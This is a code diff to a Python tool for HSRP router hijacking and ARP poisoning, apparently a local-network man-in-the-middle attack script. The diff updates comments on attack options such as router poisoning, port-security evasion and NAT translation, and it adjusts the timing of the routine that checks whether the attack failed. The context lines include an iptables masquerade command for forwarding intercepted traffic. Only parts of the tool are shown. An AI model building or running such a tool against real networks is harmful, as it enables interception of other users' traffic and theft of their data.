@@ -10,18 +10,19 @@ import random
 # [OPTIONS]
 # change as necessary
 interface = "eth0"
-# option to poison router if sniffing of response is required, makes attack more noisy, mutually exclusive with translateip
+# Default false. option to poison router if sniffing of response is required, makes attack more noisy, mutually exclusive with translateip
 # can be toggled at runtime by typing "poison"
 poisonrouter = False
-# only poison for packets of interest, when poisonrouter set to True
+# Default true. only poison for packets of interest, when poisonrouter set to True
 # see start_selective_poisoning() for rules
 silentmode = True
-# option to force use of own mac address only when sending hsrp and arp packets
+# Default true. option to force use of own mac address only when sending hsrp and arp packets
 attackportsecurity = True
-# perform nat translation for all received packets before forwarding to router. poisonrouter should be set to False when translateip set to True
+# Default False. perform nat translation for all received packets before forwarding to router. poisonrouter should be set to False when translateip set to True
 translateip = False
 # print more info to stdout at runtime. Toggleable at runtime by typing "debug"
 debug = False
+# exit when detected failed attack
 terminateonfail = False
 # for testing only, to set to false when running attack
 usepcapfile = False
@@ -385,19 +386,22 @@ def enable_translation():
     subprocess.run(f"iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE".split())
 
 def delayed_failure_check():
-    '''Check status of attack 10s after start of attack, check every hellotime + 1 seconds
+    '''Check status of attack 4x hellotime after start of attack, check every hellotime + 1 seconds
     
     Prints information to stdout'''
     start = time.time()
     global hsrpfound
     if version == 1:
         hellotime = pkcopy[HSRP].hellotime
+    else:
+        ####################
+        hellotime = 3
     # will change hsrpfound to true if active hsrp found
     check_fail = threading.Thread(target=find_hsrp, daemon=True)
     check_fail.start()
     succeeded = 0
     while True:
-        if time.time() - start > 10:
+        if time.time() - start > 4*hellotime:
             if hsrpfound:
                 print("[WARN] Attack failed")
                 succeeded = 0
